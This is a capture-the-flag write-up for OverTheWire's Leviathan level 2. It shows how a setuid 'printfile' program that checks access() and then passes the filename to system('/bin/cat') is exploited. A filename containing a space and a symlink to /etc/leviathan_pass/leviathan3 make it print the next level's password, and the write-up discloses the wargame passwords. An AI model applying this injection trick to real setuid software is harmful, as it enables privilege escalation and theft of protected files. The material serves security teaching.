# OverTheWire Project

### [Project Leviathan:](http://overthewire.org/wargames/leviathan/)

#### Leviathan Level 1 -> 2
> There is no information for this level, intentionally.

SSH into the second level using the password `ougahZi8Ta`

There's a executable called `printfile`. The program seems to run like `cat`,

```bash
leviathan2@leviathan:~$ ./printfile /etc/leviathan_pass/leviathan3
You cant have that file...
```

Unfortunately, it tells us we don't have permission to access the password.
Running ltrace shows us that the program uses a access function to check if the user has access to the file.
But this is the output if access function fails, it should return a different output if it succeeds right?
Create a directory where we have write permission in `/tmp`
Then create a dummy file to check the successful output:

```bash
leviathan2@leviathan:~$ mkdir /tmp/playfield
leviathan2@leviathan:~$ cd /tmp/playfield
leviathan2@leviathan:/tmp/playfield$ echo "hello world" > dummy
leviathan2@leviathan:/tmp/playfield$ ~/printfile dummy
hello world
leviathan2@leviathan:/tmp/playfield$ ltrace ~/printfile dummy
__libc_start_main(0x804858d, 2, 0xffffd6a4, 0x8048680 <unfinished ...>
access("dummy", 4)                                                                                                = 0
snprintf("/bin/cat dummy", 511, "/bin/cat %s", "dummy")                                                           = 14
geteuid()                                                                                                         = 12002
geteuid()                                                                                                         = 12002
setreuid(12002, 12002)                                                                                            = 0
system("/bin/cat dummy"hello world
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                            = 0
+++ exited (status 0) +++
```

So if the output is successful, the program simply executes `/bin/cat "filename"`.
Since the filename is passed into a string and executed in the shell, we can have a space in our filename so the program will `cat` a second file and display it.
We already have a dummy file, so we can create `dummy pass.txt` and `pass.txt`. Create one file `dummy pass.txt` so the access function has something to check and return a successful output with. We already have a seperate file `dummy` to have a space between the two files. Then finally, create a symbolic link to the file `pass.txt`. Since the program's effective user id is for the next level, it executes cat as the next level's user.

```bash
leviathan2@leviathan:/tmp/playfield$ touch "dummy pass.txt"
leviathan2@leviathan:/tmp/playfield$ ln -s /etc/leviathan_pass/leviathan3 pass.txt
leviathan2@leviathan:/tmp/playfield$ ls
dummy  dummy pass.txt  pass.txt
leviathan2@leviathan:/tmp/playfield$ ~/printfile "dummy pass.txt"
hello world
Ahdiemoo1j
```
**Ta-dah!, we get the password for leviathan3 which is `Ahdiemoo1j`**
